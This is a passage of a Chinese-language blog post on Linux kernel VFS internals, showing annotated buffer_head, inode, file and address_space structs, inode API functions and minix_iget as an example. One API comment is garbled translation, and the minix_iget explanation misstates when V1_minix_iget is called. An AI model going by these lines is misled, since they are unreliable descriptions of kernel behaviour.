</ul>
<p><strong>Buffer cache</strong></p>
<p>缓冲区缓存是一个内核子系统，用于处理来自块设备的缓存（读取和写入）块，缓冲区缓存使用的基本实体是 <code>buffer_head</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> b_state;		<span class="comment">/* 缓冲区的状态 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">b_this_page</span>;</span><span class="comment">/* circular list of page&#x27;s buffers */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">b_page</span>;</span>		<span class="comment">/* the page this bh is mapped to */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">sector_t</span> b_blocknr;		<span class="comment">/* 设备上已加载或需要保存在磁盘上的块数 */</span></span><br><span class="line">	<span class="keyword">size_t</span> b_size;			<span class="comment">/* 缓冲区大小 */</span></span><br><span class="line">	<span class="keyword">char</span> *b_data;			<span class="comment">/* 指向Read/Write内存区域的指针(缓冲区主体) */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">b_bdev</span>;</span> <span class="comment">/* 指向块设备 */</span></span><br><span class="line">	<span class="keyword">bh_end_io_t</span> *b_end_io;		<span class="comment">/* I/O completion */</span></span><br><span class="line"> 	<span class="keyword">void</span> *b_private;		<span class="comment">/* reserved for b_end_io */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">b_assoc_buffers</span>;</span> <span class="comment">/* associated with another mapping */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">b_assoc_map</span>;</span>	<span class="comment">/* mapping this buffer is</span></span><br><span class="line"><span class="comment">						   associated with */</span></span><br><span class="line">	<span class="keyword">atomic_t</span> b_count;		<span class="comment">/* users using this buffer_head */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> b_uptodate_lock;	<span class="comment">/* Used by the first bh in a page, to</span></span><br><span class="line"><span class="comment">					 * serialise IO completion of other</span></span><br><span class="line"><span class="comment">					 * buffers in the page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>函数和有用的宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">find_first_zero_bit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span>; <span class="comment">/* 查找内存区域中的第一个零位(size参数表示搜索区域中的位数) */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_and_set_bit</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr)</span></span>; <span class="comment">/* 设置一位并获取旧值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_and_clear_bit</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr)</span></span>; <span class="comment">/* 删除一位并获取旧值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_and_change_bit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *p)</span></span>; <span class="comment">/* 反转一位并获取旧值 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISDIR(mode)  (((mode) &amp; S_IFDIR) == S_IFDIR) <span class="comment">// 检查inode是否为目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISCHR(mode)  (((mode) &amp; S_IFCHR) == S_IFCHR) <span class="comment">// 检查inode是否为字符设备</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISBLK(mode)  (((mode) &amp; S_IFBLK) == S_IFBLK) <span class="comment">// 检查inode是否为块设备</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISREG(mode)  (((mode) &amp; S_IFREG) == S_IFREG) <span class="comment">// 检查inode是否为常规文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISFIFO(mode) (((mode) &amp; S_IFIFO) == S_IFIFO) <span class="comment">// 检查inode是否为FIFO</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISLNK(mode)  (((mode) &amp; S_IFLNK) == S_IFLNK) <span class="comment">// 检查inode是否为链接</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISSOCK(mode) (((mode) &amp; S_IFSOCK) == S_IFSOCK) <span class="comment">// 检查inode是否为socket</span></span></span><br></pre></td></tr></table></figure>
<p><strong>The Inode Structure</strong></p>
<p>索引节点 inode 是 UNIX 文件系统的重要组成部分，同时也是 VFS 的重要组成部分</p>
<p>索引节点是元数据（它具有有关信息的信息）：</p>
<ul>
<li>索引节点唯一标识磁盘上的文件并保存有关该文件的信息（uid、gid、访问权限、访问时间、指向数据块的指针等）</li>
<li>索引节点是指磁盘上的文件，一个 inode 可以关联任意数量的 <code>file</code> 结构（多个进程可以打开同一个文件，或者一个进程可以多次打开同一个文件）</li>
<li>与 VFS 中的其他结构一样，它是一种通用结构，它涵盖了所有受支持的文件类型的选项，甚至包括那些没有关联磁盘实体（如 FAT）的文件类型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">	<span class="keyword">umode_t</span>			i_mode; <span class="comment">/* 访问权限 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		i_opflags;</span><br><span class="line">	<span class="keyword">kuid_t</span>			i_uid; <span class="comment">/* uid */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>			i_gid; <span class="comment">/* gid */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		i_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FS_POSIX_ACL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>	*<span class="title">i_acl</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>	*<span class="title">i_default_acl</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>	*<span class="title">i_op</span>;</span> <span class="comment">/* 指向操作inode的回调函数集 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>	*<span class="title">i_sb</span>;</span> <span class="comment">/* inode所属文件系统的超级块结构 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">i_mapping</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*i_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Stat data, not accessed from path walking */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		i_ino; <span class="comment">/* inode的编号(唯一标识文件系统中的inode) */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> i_nlink; <span class="comment">/* 链接计数,对于没有链接(硬链接或符号链接)的文件系统,此值始终设置为&#x27;1&#x27; */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> __i_nlink;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">dev_t</span>			i_rdev; <span class="comment">/* 挂载此文件系统的设备 */</span></span><br><span class="line">	<span class="keyword">loff_t</span>			i_size; <span class="comment">/* 大小(以字节为单位) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span>	<span class="title">i_atime</span>;</span> <span class="comment">/* access time:上一次访问该inode的时间 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span>	<span class="title">i_mtime</span>;</span> <span class="comment">/* modify time:上一次修改该inode的时间 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span>	<span class="title">i_ctime</span>;</span> <span class="comment">/* change time:上一次该inode状态改变的时间 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		i_lock;	<span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>          i_bytes;</span><br><span class="line">	u8			i_blkbits; <span class="comment">/* 用于块大小的位数 */</span></span><br><span class="line">	u8			i_write_hint;</span><br><span class="line">	<span class="keyword">blkcnt_t</span>		i_blocks; <span class="comment">/* 文件使用的块数(这仅由配额子系统使用) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __NEED_I_SIZE_ORDERED</span></span><br><span class="line">	<span class="keyword">seqcount_t</span>		i_size_seqcount;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Misc */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		i_state;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span>	<span class="title">i_rwsem</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		dirtied_when;	<span class="comment">/* jiffies of first dirtying */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		dirtied_time_when;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">i_hash</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">i_io_list</span>;</span>	<span class="comment">/* backing dev IO list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_WRITEBACK</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bdi_writeback</span>	*<span class="title">i_wb</span>;</span>		<span class="comment">/* the associated cgroup wb */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* foreign inode detection, see wbc_detach_inode() */</span></span><br><span class="line">	<span class="keyword">int</span>			i_wb_frn_winner;</span><br><span class="line">	u16			i_wb_frn_avg_time;</span><br><span class="line">	u16			i_wb_frn_history;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">i_lru</span>;</span>		<span class="comment">/* inode LRU list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">i_sb_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">i_wb_list</span>;</span>	<span class="comment">/* backing dev writeback list */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	<span class="title">i_dentry</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">i_rcu</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">atomic64_t</span>		i_version;</span><br><span class="line">	<span class="keyword">atomic_t</span>		i_count; <span class="comment">/* inode计数器(指示有多少内核组件使用该inode) */</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		i_dio_count;</span><br><span class="line">	<span class="keyword">atomic_t</span>		i_writecount;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IMA</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		i_readcount; <span class="comment">/* struct files open RO */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">i_fop</span>;</span>	<span class="comment">/* 指向操作file的回调函数集 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_lock_context</span>	*<span class="title">i_flctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	<span class="title">i_data</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">i_devices</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>	*<span class="title">i_pipe</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>	*<span class="title">i_bdev</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>		*<span class="title">i_cdev</span>;</span></span><br><span class="line">		<span class="keyword">char</span>			*i_link;</span><br><span class="line">		<span class="keyword">unsigned</span>		i_dir_seq;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	__u32			i_generation;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FSNOTIFY</span></span><br><span class="line">	__u32			i_fsnotify_mask; <span class="comment">/* all events this inode cares about */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fsnotify_mark_connector</span> __<span class="title">rcu</span>	*<span class="title">i_fsnotify_marks</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_FS_ENCRYPTION)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fscrypt_info</span>	*<span class="title">i_crypt_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span>			*i_private; <span class="comment">/* fs or device private pointer */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>相关 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct inode *<span class="title">new_inode</span><span class="params">(struct super_block *sb)</span></span>; <span class="comment">/* 创建一个新的inode,初始化字段i_nlink,i_blkbits,i_sbi_dev(设置为&#x27;1&#x27;) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_inode_hash</span><span class="params">(struct inode *inode)</span></span>; <span class="comment">/* 将传入的inode添加到inode的哈希表中,如果inode被标记为脏,它将写入磁盘 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mark_inode_dirty</span><span class="params">(struct inode *inode)</span></span>; <span class="comment">/* 将井内脏标记为脏污后,将它写回磁盘 */</span></span><br><span class="line"><span class="function">struct inode * <span class="title">iget_locked</span><span class="params">(struct super_block *, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>; <span class="comment">/* 从磁盘加载具有给定编号的inode */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock_new_inode</span><span class="params">(struct inode *)</span></span>; <span class="comment">/* 与iget_locked结合使用,释放inode上的锁 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">iput</span><span class="params">(struct inode *)</span></span>; <span class="comment">/* 告诉内核在inode上的工作已完成,如果没有其他程序使用该inode,它将被销毁(如果该inode为脏,则在写回磁盘后销毁) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_bad_inode</span><span class="params">(struct inode *)</span></span>; <span class="comment">/* 告诉内核不能使用该inode */</span></span><br></pre></td></tr></table></figure>
<p>创建一个 inode：</p>
<ul>
<li>通常，此函数将调用 <code>iget_locked</code> 从 VFS 获取 inode 结构，如果 inode 是新创建的，则需要从磁盘读取对应的超级块（使用 sb_bread）并填写有用的信息</li>
<li>例如文件系统 minix 的 <code>minix_iget</code> 函数 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct inode *<span class="title">minix_iget</span><span class="params">(struct super_block *sb, <span class="keyword">unsigned</span> <span class="keyword">long</span> ino)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">    inode = iget_locked(sb, ino);</span><br><span class="line">    <span class="keyword">if</span> (!inode)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line">    <span class="keyword">if</span> (!(inode-&gt;i_state &amp; I_NEW))</span><br><span class="line">        <span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (INODE_VERSION(inode) == MINIX_V1)</span><br><span class="line">        <span class="keyword">return</span> V1_minix_iget(inode);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">V1_minix_iget</span><span class="params">(struct inode *inode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">minix_inode</span> * <span class="title">raw_inode</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">minix_inode_info</span> *<span class="title">minix_inode</span> =</span> minix_i(inode);</span><br><span class="line">      <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">      raw_inode = minix_V1_raw_inode(inode-&gt;i_sb, inode-&gt;i_ino, &amp;bh);</span><br><span class="line">      <span class="keyword">if</span> (!raw_inode) &#123;</span><br><span class="line">              iget_failed(inode);</span><br><span class="line">              <span class="keyword">return</span> ERR_PTR(-EIO);</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>minix_iget</code> 会先调用 <code>iget_locked</code> 来获取具有给定编号的 inode</li>
<li>如果没有成功获取，程序将调用 <code>V1_minix_iget</code>，进而调用 <code>minix_V1_raw_inode</code> 来从磁盘读取输入，然后使用读取信息完成 inode</li>
</ul>
<p><strong>The File Structure</strong></p>
<p>文件结构对应于进程打开的文件，仅存在于内存中，与 inode 相关联</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span> <span class="comment">/* 文件对象链表 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span> <span class="comment">/* 释放之后的RCU链表 */</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span> <span class="comment">/* 包含的目录项 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span> <span class="comment">/* 索引结点 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">f_op</span>;</span> <span class="comment">/* 指向操作file的回调函数集 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock; <span class="comment">/* 保护文件的自旋锁 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags; <span class="comment">/* 文件标志:O_RDONLY,O_NONBLOCK,O_SYNC */</span></span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode; <span class="comment">/* 文件读/写模式:FMODE_READ,FMODE_WRITE */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos; <span class="comment">/* 当前读写位置 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data; <span class="comment">/* 文件私有数据 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_ep_links</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span> <span class="comment">/* 指向该页所在地址空间描述结构的指针 */</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>文件系统的文件操作 <code>file-&gt;f_op</code> 是使用 <code>inode-&gt;i_fop</code> 字段初始化的，以便后续系统调用使用存储在 <code>file-&gt;f_op</code> 中的值</li>
<li>结构体 <code>file</code> 中还有一个有意思的条目 <code>address_space</code>，值得单独分析一下（其实这个条目是由 <code>inode-&gt;i_data</code> 进行初始化的）</li>
</ul>
<p><strong>Address space operations</strong></p>
<p>进程的地址空间和文件之间有着密切的联系：</p>
<ul>
<li>程序的执行几乎完全是通过将文件映射到进程地址空间来完成的（例如 <code>execve</code>）</li>
<li>由于此方法运行良好且非常通用，因此也可用于常规系统调用，如读取和写入</li>
</ul>
<p>描述地址空间的结构是 <code>address_space</code>（也被称为地址空间描述符），并且使用它的操作由结构体 <code>address_space_operations</code> 描述，要初始化地址空间操作，必须填写 <code>inode-&gt;i_mapping-&gt;a_ops</code></p>
<p>结构体 <code>address_space</code> 用于管理 “索引结点inode” 到 “内存页面-page” 的映射：</p>
<ul>
<li>一个文件对应一个 <code>address_space</code> 结构</li>
<li>一个 <code>address_space</code> 与一个偏移量能够确定 <code>page cache</code> 或 <code>swap cache</code> 中的一个页面</li>
<li>结构体 <code>address_space</code> 的条目如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">host</span>;</span> <span class="comment">/* 指向对应的索引结点 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">i_pages</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span>			gfp_mask;</span><br><span class="line">	<span class="keyword">atomic_t</span>		i_mmap_writable; <span class="comment">/* 共享映射数VM_SHARED记数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root_cached</span>	<span class="title">i_mmap</span>;</span> <span class="comment">/* 优先搜索树的root */</span></span><br><span class="line">	<span 